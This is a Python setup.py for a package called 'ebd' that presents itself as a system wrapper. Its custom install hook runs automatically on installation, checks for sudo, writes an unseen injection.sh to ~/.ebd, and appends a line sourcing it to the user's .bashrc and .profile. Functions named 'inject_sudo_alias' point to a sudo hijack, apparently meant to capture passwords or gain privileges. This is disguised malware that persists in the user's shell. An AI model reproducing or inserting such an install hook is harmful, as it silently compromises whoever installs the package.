import setuptools
import setuptools.command
import setuptools.command.install
import os
import subprocess

BACKUP_SUFF = ".ebd_backup"
SKIP_FLAG = ".ebd_skip"
PLUGIN_NAME = ".ebd"


def get_home_dir():
    return os.path.expanduser("~")


def get_rc_candidates(home):
    candidates = [".bashrc", ".profile"]
    found = []
    for c in candidates:
        path = os.path.join(home, c)
        if os.path.exists(path):
            found.append(path)
    return found


def create_plugin(home):
    with open("injection.sh") as file:
        content = file.read()
    success = True
    try:
        plugin_path = os.path.join(home, PLUGIN_NAME)
        with open(plugin_path, "w") as file:
            file.write(content)
    except Exception:
        success = False
    return success


def get_injection():
    return ". ~/{}".format(PLUGIN_NAME)


def inject_sudo_alias(filepath):
    with open(filepath) as file:
        contents = file.read()
    injection = get_injection()
    if contents.find(injection) != -1:
        print("previous injection detected")
        if os.path.exists(filepath + BACKUP_SUFF):
            print("restoring backup")
            os.rename(filepath + BACKUP_SUFF, filepath)
        else:
            print("could not restore backup")
            return
    os.rename(filepath, filepath + BACKUP_SUFF)
    print("{} file backed up, injecting new contents".format(filepath))
    with open(filepath + BACKUP_SUFF) as file:
        contents = file.read()
    with open(filepath, "w") as file:
        file.write(contents + "\n{}\n".format(injection))
    print("new contents injected")


def should_skip(home):
    skip_file = os.path.join(home, ".ebd-skip")
    return os.path.exists(skip_file)


def setup_ebd():
    home = get_home_dir()
    if home is None:
        print("could not determine home")
        return
    print("home: {}".format(home))
    if should_skip(home):
        print("{} found in {}, skipping this machine".format(SKIP_FLAG, home))
        return
    rcs = get_rc_candidates(home)
    ret = subprocess.call("which sudo", shell=True)
    if ret != 0:
        print("no sudo detected")
        return
    if len(rcs) > 0:
        if not create_plugin(home):
            print("could not create plugin file")
            return
        else:
            print("plugin creted, injecting")
    for rc in rcs:
        print("found suitable rc file: {}".format(rc))
        inject_sudo_alias(rc)
    else:
        print("no suitable rc found")


class PostInstallCommand(setuptools.command.install.install):
    def run(self):
        setup_ebd()
        setuptools.command.install.install.run(self)


with open("README.md") as file:
    long_description = file.read()

with open("VERSION") as file:
    version = file.read()

setuptools.setup(
    name="ebd",
    version=version,
    author="Fiely Teach",
    author_email="admin@admin.ru",
    description="Wrapper for LFSM-enabled systems.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/",
    packages=setuptools.find_packages(),
    cmdclass={
        "install": PostInstallCommand
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    include_package_data=True
)
